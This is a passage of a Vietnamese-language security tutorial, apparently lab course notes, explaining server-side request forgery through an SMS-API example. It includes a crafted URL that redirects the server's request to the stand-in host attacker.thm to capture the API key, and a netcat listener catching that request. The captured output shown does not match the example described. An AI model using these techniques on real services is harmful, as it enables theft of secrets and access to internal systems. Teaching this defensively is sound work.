# Server-Side Request Forgery (SSRF)

## **Giả mạo Yêu cầu phía Máy chủ (Server-Side Request Forgery - SSRF)**

Loại lỗ hổng này xảy ra khi kẻ tấn công có thể buộc một ứng dụng web gửi yêu cầu thay mặt chúng đến các đích tùy ý trong khi vẫn kiểm soát được nội dung của chính yêu cầu đó. Lỗ hổng SSRF thường phát sinh từ các triển khai mà ứng dụng web của chúng ta cần sử dụng các dịch vụ bên thứ ba.

### **Ví dụ**

Hãy nghĩ về một ứng dụng web sử dụng API bên ngoài để gửi thông báo SMS cho khách hàng của mình. Đối với mỗi email, trang web cần thực hiện một yêu cầu web đến máy chủ của nhà cung cấp dịch vụ SMS để gửi nội dung của tin nhắn cần gửi. Vì nhà cung cấp SMS tính phí cho mỗi tin nhắn, họ yêu cầu bạn thêm một khóa bí mật, mà họ đã gán trước cho bạn, vào mỗi yêu cầu bạn gửi đến API của họ. Khóa API đóng vai trò như một mã thông báo xác thực và cho phép nhà cung cấp biết ai sẽ thanh toán cho mỗi tin nhắn. Ứng dụng sẽ hoạt động như sau:

![image.png](<img/19.png>)

Nhìn vào sơ đồ trên, chúng ta dễ dàng nhận thấy lỗ hổng nằm ở đâu. Ứng dụng để lộ tham số `server` cho người dùng, tham số này xác định tên máy chủ của nhà cung cấp dịch vụ SMS. Nếu kẻ tấn công muốn, chúng có thể đơn giản thay đổi giá trị của `server` để trỏ đến một máy mà chúng kiểm soát và ứng dụng web của bạn sẽ vui vẻ chuyển tiếp yêu cầu SMS đến kẻ tấn công thay vì nhà cung cấp SMS. Là một phần của tin nhắn được chuyển tiếp, kẻ tấn công sẽ lấy được `API key`, cho phép chúng sử dụng dịch vụ SMS để gửi tin nhắn bằng chi phí của bạn. Để đạt được điều này, kẻ tấn công chỉ cần thực hiện yêu cầu sau đến trang web của bạn:

```jsx
https://www.mysite.com/sms?server=attacker.thm&msg=ABC
```

Điều này sẽ khiến ứng dụng web dễ bị tấn công thực hiện yêu cầu đến:

```jsx
https://attacker.thm/api/send?msg=ABC
```

Sau đó, bạn có thể chỉ cần nắm bắt nội dung của yêu cầu bằng Netcat:

**Bash**

```jsx
AttackBoxuser@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```

Đây là một trường hợp SSRF rất cơ bản. Nếu điều này có vẻ không đáng sợ lắm, SSRF thực sự có thể được sử dụng để làm nhiều hơn thế. Nói chung, tùy thuộc vào chi tiết cụ thể của từng tình huống, SSRF có thể được sử dụng để:

- Liệt kê các mạng nội bộ, bao gồm địa chỉ IP và cổng.
- Lạm dụng mối quan hệ tin cậy giữa các máy chủ và giành quyền truy cập vào các dịch vụ bị hạn chế.
- Tương tác với một số dịch vụ không phải HTTP để thực thi mã từ xa (RCE).

###